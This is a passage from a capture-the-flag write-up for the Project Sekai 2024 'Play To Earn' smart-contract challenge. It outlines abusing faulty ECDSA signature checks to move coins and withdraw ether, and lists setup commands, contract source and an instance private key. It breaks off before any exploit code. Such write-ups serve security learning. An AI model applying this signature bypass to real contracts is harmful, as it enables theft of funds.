@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+
+  
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="">  
+
+
+  
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="" />
+  <meta property="og:image" content="https://wepfen.github.io//images/avatar.png" />
+  <meta property="og:url" content="https://wepfen.github.io/writeups/playtoearn/">
+  <meta property="og:title" content="Project Sekai 2024 - Play To Earn [blockchain]">
+  <meta property="og:site_name" content="wepfen.github.io">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="wepfen.github.io">
+  <meta property="twitter:url" content="https://wepfen.github.io/writeups/playtoearn/">
+  <meta name="twitter:title" content="Project Sekai 2024 - Play To Earn [blockchain]">
+  <meta name="twitter:description" content="">
+  <meta name="twitter:image" content="https://wepfen.github.io//images/avatar.png">
+  
+  <title>
+    
+      Project Sekai 2024 - Play To Earn [blockchain]
+    
+  </title>
+
+
+  <link rel="icon" type="image/gif" href="/images/oia-uia.gif" />
+   
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.9bb372a616563f9ecafd6e5ea0d7760c487f35e7358f212b258b477fbfa75f5264ef33aaffa0334383ffc444b631b8dc5c496c67b5830ab2ac1f1e226a1125c3.css" integrity="sha512-m7NyphZWP57K/W5eoNd2DEh/Nec1jyErJYtHf7&#43;nX1Jk7zOq/6AzQ4P/xES2MbjcXElsZ7WDCrKsHx4iahElww==" />
+
+  
+
+
+</head>
+
+    <body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~/</a>
+
+
+
+
+<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>
+
+<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">
+
+<svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+  <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
+</svg>
+
+</button>
+
+
+
+
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2024-08-28 20:38:48 &#43;0200 CEST">
+            2024-08-28
+        </time>
+    </p>
+
+    <h1>Project Sekai 2024 - Play To Earn [blockchain]</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#setup">Setup</a></li>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#vulnerability">Vulnerability</a></li>
+      </ul>
+    </li>
+    <li><a href="#solving">Solving</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <blockquote>
+<p>Difficulty : Easy to medium</p>
+</blockquote>
+<blockquote>
+<p>Team : Phreaks2600</p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/blockchains/play-to-earn"> Source files </a></p>
+</blockquote>
+<blockquote>
+<p>You can buy coins.</p>
+<p>Of course, you can exchange it back to cash at the original purchase price if there is any left after playing :)</p>
+</blockquote>
+<h1 id="tldr">TL;DR</h1>
+<ul>
+<li>Start an instance</li>
+<li>Register my address</li>
+<li>Exploit bad ecdsa signature verification to allow myself some funds to transfer coins from another address to myself</li>
+<li>transfer coin from address(0) to my address</li>
+<li>withdraw the ether an get the coin</li>
+</ul>
+<h1 id="introduction">Introduction</h1>
+<p>We got three contracts <code>ArcadeMachine.sol</code>, <code>Coin.sol</code> and <code>Setup.sol</code></p>
+<p>The main contract is <code>Coin.sol</code> which have the ether to steal.</p>
+<p>To solve the challenge we need to have 13.37 or more ether on our balance and be registered, in <code>Setup</code> contract :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> player <span style="color:#7a8478">!=</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>) <span style="color:#7a8478">&amp;&amp;</span> player.<span style="color:#d699b6">balance</span> <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">13</span>.<span style="color:#d699b6">37</span> <span style="color:#e67e80">ether</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To register we have to interact with <code>Setup</code> contract by calling the function <code>Register</code>.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">register</span>() <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(player <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>));
+</span></span><span style="display:flex;"><span>        player <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>        coin.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#d699b6">1337</span>);    <span style="color:#859289;font-style:italic">// free coins for new players :)
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For almost every blockchain interaction in this challenge, I used <a href="https://book.getfoundry.sh">foundry</a> toolkit.</p>
+<h2 id="setup">Setup</h2>
+<p>But before all of that we got to start instance, i will be short on this part but all we had to do is interact with the server and choose to start an instance with the command:
+<code>ncat --ssl play-to-earn.chals.sekai.team 1337</code>.</p>
+<p>And it will give us the setup address, my address, my private key, and URL and a personnal UUID for identifiying myself and get the flag.</p>
+<p>And we can get <strong>Coin</strong> and <strong>ArcadeMachine</strong> contracts addresses by using cast on Setup contract as they are public and defined in the latter:</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Setup {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Coin <span style="color:#e67e80">public</span> coin;
+</span></span><span style="display:flex;"><span>    ArcadeMachine <span style="color:#e67e80">public</span> arcadeMachine;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> player;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For Coin : <code>cast call -r $RPC $SETUP &quot;coin()&quot;</code></p>
+<p>For ArcadeMachine : <code>cast call -r $RPC $SETUP &quot;arcadeMachine()&quot;</code></p>
+<p>I set up an environment variable via a file <code>.env</code> file to go faster and hardcoded a way to get <code>Coin</code> and <code>ArcadeMachine</code> address automatically each time I source the <code>.env</code> file with <code>source .env</code>.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MY_UUID<span style="color:#7a8478">=</span>05d37b3f-db11-4398-a036-fe2de2532bdd
+</span></span><span style="display:flex;"><span>RPC<span style="color:#7a8478">=</span>https://play-to-earn.chals.sekai.team/05d37b3f-db11-4398-a036-fe2de2532bdd
+</span></span><span style="display:flex;"><span>PKEY<span style="color:#7a8478">=</span>0x9f9ab104ea0ea88cbfea172e21ef9ad3c779039b16d0403ea4b69714b68570fc
+</span></span><span style="display:flex;"><span>ADDRESS<span style="color:#7a8478">=</span>0x7689DDAcC618C9FABca377B7630E5C5546726139
+</span></span><span style="display:flex;"><span>SETUP<span style="color:#7a8478">=</span>0x85f5C75dd2A6e4F6e046F74921aDf2FD25496F05
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ARCADEMACHINE<span style="color:#7a8478">=</span><span style="color:#b2c98f">&#34;0x</span><span style="color:#e67e80">$(</span>cast call $SETUP -r $RPC <span style="color:#b2c98f">&#34;arcadeMachine()&#34;</span> | tail -c 41<span style="color:#e67e80">)</span><span style="color:#b2c98f">&#34;</span>
+</span></span><span style="display:flex;"><span>COIN<span style="color:#7a8478">=</span><span style="color:#b2c98f">&#34;0x</span><span style="color:#e67e80">$(</span>cast call $SETUP -r $RPC <span style="color:#b2c98f">&#34;coin()&#34;</span> | tail -c 41<span style="color:#e67e80">)</span><span style="color:#b2c98f">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">alias</span> check_wallet<span style="color:#7a8478">=</span><span style="color:#b2c98f">&#39;cast balance $ADDRESS -r $RPC&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>check_wallet</code> is to quickly check if the instance is still up because we only got 30 minutes per instance.</p>
+<h2 id="recon">Recon</h2>
+<details>
+  <summary style="color: #F99417; cursor: pointer">ArcadeMachine.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">25</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> { Coin } <span style="color:#e67e80">from</span> <span style="color:#b2c98f">&#34;./Coin.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> ArcadeMachine {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Coin coin;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(Coin _coin) {
+</span></span><span style="display:flex;"><span>        coin <span style="color:#7a8478">=</span> _coin;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">play</span>(<span style="color:#dbbc7f">uint256</span> times) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#859289;font-style:italic">// burn the coins
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>        <span style="color:#d699b6">require</span>(coin.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>), <span style="color:#d699b6">1</span> <span style="color:#e67e80">ether</span> <span style="color:#7a8478">*</span> times));
+</span></span><span style="display:flex;"><span>        <span style="color:#859289;font-style:italic">// Have fun XD
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<details>
+  <summary style="color: #F99417; cursor: pointer">Coin.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 63
